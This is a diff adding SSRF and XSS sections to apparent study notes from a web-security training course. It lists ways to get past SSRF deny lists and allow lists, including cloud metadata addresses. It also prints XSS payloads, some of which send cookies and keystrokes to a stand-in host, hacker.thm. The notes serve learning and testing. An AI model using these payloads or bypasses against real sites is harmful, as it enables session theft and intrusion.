@@ -2765,3 +2765,91 @@ RFI steps include:
 5. Allow only protocols and PHP wrappers when needed
 6. Never trust user input; implement proper input validation
 7. Implement whitelisting for file names and locations; the same for blacklisting
+
+## SSRF
+*Server-Side Request Forgery* is a vulnerability that causes the webserver to make an additional/edited HTTP request to a chosen resource. There are two types:
++ Regular SSRF - data is returned to attacker's screen
++ Blind SSRF - no information is returned to attacker's screen
+
+SSRF attacks can result in:
++ Unauthorised access to restricted areas and data
++ Scale into internal networks
++ Reveal authentication tokens and credentials
+
+### Finding SSRFs
+These vulnerabilities can be identified in numerous ways:
++ A full URL is used in a paremeter in the address bar (e.g. https://website.thm/form?server=http://server.website.thm/store)
++ A hidden field in a form (e.g. value="http://server.website.thm/store")
++ A partial URL, such as the hostname (e.g. https://website.thm/form?server=api)
++ A path of the URL (e.g. https://website.thm/form?dst=/forms/contact)
+
+Note: a lot of trial and error will be required
+
+For blind SSRFs, an external HTTP logging tool would be required (e.g. request.bin, own HTTP server, Burp Suite's Collaborator).
+
+### Beating Common SSRF Defenses
+1. Deny List - alternative localhost references (e.g 0, 0.0.0.0, 0000, 127.1, 127\.*\.*\.*, 2130706433, 017700000001, subdomains that have DNS record which resolves to 127.0.0.1); for cloud environments, register a subdomain in their your own domain with a DNS record that points to 169.254.169.254
+2. Allow List - create a subdomain on your own domain name (e.g. https://website.thm.attackers-domain.thm)
+3. Open Redirect - utilise automatic redirection (e.g. https://website.thm/link?url=https://tryhackme.com) to redirect HTTP request to a chosen domain
+
+## XSS
+*Cross-Site Scripting (XSS)* is an attack where malicious JavaScript is injected into a web application, with the intention of being executed by other users. 
+
+XSS payloads have two parts: intention (i.e. what the code will do) and modification (i.e. changes to the code per scenario).
+
+Examples of XSS intentions include:
++ Proof of Concept - to demonstrate that XSS is achievable; E.g.
+```
+<script>alert('XSS');</script>
+```
++ Session Stealing - targets login tokens/cookies; E.g.
+```
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+```
++ Key Logger - anything typed will be forwarded; E.g.
+```
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+```
++ Business Logic - more specific objectives; E.g.
+```
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
+
+### Types of XSS Vulnerabilities
+#### Reflected XSS
+This occurs when user-supplied data in HTTP requests is not validated. 
+
+Example: website errors is taken from a parameter in the query string directly into the page source (e.g. https://website.thm/?error=Invalid Input Detected); attackers can insert malicious code
+
+How to test:
++ Parameters in the URL query string
++ URL file path
++ HTTP headers; Note: not likely exploitable in practice
+
+#### Stored XSS
+Occurs when the XSS payload is stored on the web application (i.e. in a database) and is executed when other users visit the page.
+
+Example: a blog website that allows user comments and does not filter malicious code; attackers can comment malicious code
+
+How to test:
++ Comments on a blog
++ User profile information
++ Website listings
++ Manual HTTP request 
+
+#### DOM-based XSS
+Document Object Model (DOM) exploitation happens directly in the browser without loading new pages or data being submitted. These occur when a website JavaScript code acts on input or user interaction.
+
+Example: a website gets content from window.location.hash parameter and writes onto the page currently viewed section, which does not filter the hashes; attackers can inject code 
+
+How to test:
++ Look for accessible and controllable variables in the source code (e.g. window.location.x parameters), eval())
+
+#### Blind XSS
+Similar to stored XSS, the payloads get stored in a website but the attacker cannot see it working. 
+
+Example: website's contact form allows messaging, which does not check for malicious code; attackers can enter malicious code for staff to view on their private portal.
+
+How to test:
++ Add a call back (e.g. HTTP request) to the payload
++ Use tools such as [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express); alternaitively, make your own tool
